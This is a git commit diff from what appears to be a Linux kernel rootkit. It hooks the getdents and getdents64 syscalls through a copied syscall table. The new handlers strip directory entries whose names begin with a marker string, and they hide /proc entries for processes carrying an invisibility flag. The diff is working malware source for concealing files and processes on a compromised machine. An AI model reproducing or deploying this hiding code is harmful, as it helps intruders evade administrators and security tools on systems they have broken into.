7750c78378eb764972390eac0a639ef72535bbc4
Claudio Migliorelli <migliorelliclaudio@gmail.com>
2021-03-26 11:06:23 +0000

    getdents and getdents64 hooked

--- src/headers/hook.h
+++ src/headers/hook.h
@@ -2,6 +2,23 @@
 #define HOOK_H
 
 #include <linux/perf_event.h>
+#include <linux/dirent.h>
+#include <linux/proc_ns.h>
+#include <linux/fdtable.h>
+
+struct linux_dirent {
+        unsigned long   d_ino;
+        unsigned long   d_off;
+        unsigned short  d_reclen;
+        char            d_name[1];
+};
+
+#define TO_HIDE "lzrs_suffix"
+#define TSK_INVISIBLE 0x10000000
+#define SIGPROC 31
+
+void do_hide_dir_proc(void);
+void undo_hide_dir_proc(void);
 
 int hook_syscall_table(void);
 
--- src/hook.c
+++ src/hook.c
@@ -21,6 +21,146 @@ void handler(struct pt_regs *regs)
   regs->di += off / sizeof(unsigned long);
 }
 
+struct task_struct *find_task(pid_t pid)
+{
+  struct task_struct *__current = current;
+  for_each_process(__current) {
+	if (__current->pid == pid)
+	  return __current;
+  }
+  return NULL;
+}
+
+int is_invisible(pid_t pid)
+{
+  struct task_struct *task = current;
+  if (!pid)
+	goto exit;
+  task = find_task(pid);
+  if (!task)
+	goto exit;
+  if (task->flags & TSK_INVISIBLE)
+	return 1;
+  goto exit;
+ exit:
+  return 0;
+}
+
+static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
+{
+  unsigned short proc = 0;
+  unsigned long off = 0;
+  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+  struct inode *d_inode;
+  
+  int fd = (int) pt_regs->di;
+  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+
+  t_syscall orig_syscall = SYSCALL(getdents64);
+  int ret = orig_syscall(pt_regs), err;
+
+  if (ret <= 0)
+	return ret;
+
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+	return ret;
+
+  err = copy_from_user(kdirent, dirent, ret); // buffer is user space
+  if (err) {
+	kfree(kdirent);
+	return ret;
+  }
+
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+  /* procfs root directory */
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+	proc = 1;
+  /* iterate through entries */
+  while (off < ret) {
+	dir = (void *)kdirent + off;
+	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0)) ||
+		(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+	  if (dir == kdirent) {
+		/* hide current entry */
+		ret -= dir->d_reclen;
+		memmove(dir, (void *)dir + dir->d_reclen, ret);
+		continue;
+	  }
+	  prev->d_reclen += dir->d_reclen;
+	}
+	else
+	  prev = dir;
+	off += dir->d_reclen;
+  }
+	
+  /* send output buffer to user space */
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err) {
+	kfree(kdirent);
+	return ret;
+  }
+  return ret;
+}
+
+static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
+{
+  unsigned short proc = 0;
+  unsigned long off = 0;
+  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+  struct inode *d_inode;
+  
+  int fd = (int) pt_regs->di;
+  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+
+  t_syscall orig_syscall = SYSCALL(getdents);
+  int ret = orig_syscall(pt_regs), err;
+
+  if (ret <= 0)
+	return ret;
+
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+	return ret;
+
+  err = copy_from_user(kdirent, dirent, ret); // buffer is user space
+  if (err) {
+	kfree(kdirent);
+	return ret;
+  }
+
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+  /* procfs root directory */
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+	proc = 1;
+  /* iterate through entries */
+  while (off < ret) {
+	dir = (void *)kdirent + off;
+	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0)) ||
+		(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+	  if (dir == kdirent) {
+		/* hide current entry */
+		ret -= dir->d_reclen;
+		memmove(dir, (void *)dir + dir->d_reclen, ret);
+		continue;
+	  }
+	  prev->d_reclen += dir->d_reclen;
+	}
+	else
+	  prev = dir;
+	off += dir->d_reclen;
+  }
+  /* send output buffer to user space */
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err) {
+	kfree(kdirent);
+	return ret;
+  }
+  return ret;
+}
+
 static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
 {
   t_syscall orig_syscall = SYSCALL(execve);
@@ -53,6 +193,8 @@ int hook_syscall_table(void)
   memcpy(fake_sct, sct, sizeof(fake_sct));
 
   HOOK(execve, new_sys_execve);
+  HOOK(getdents64, new_sys_getdents64);
+  HOOK(getdents, new_sys_getdents);
 
   call_sys_addr = get_syscall_64_addr();
   if (!call_sys_addr)
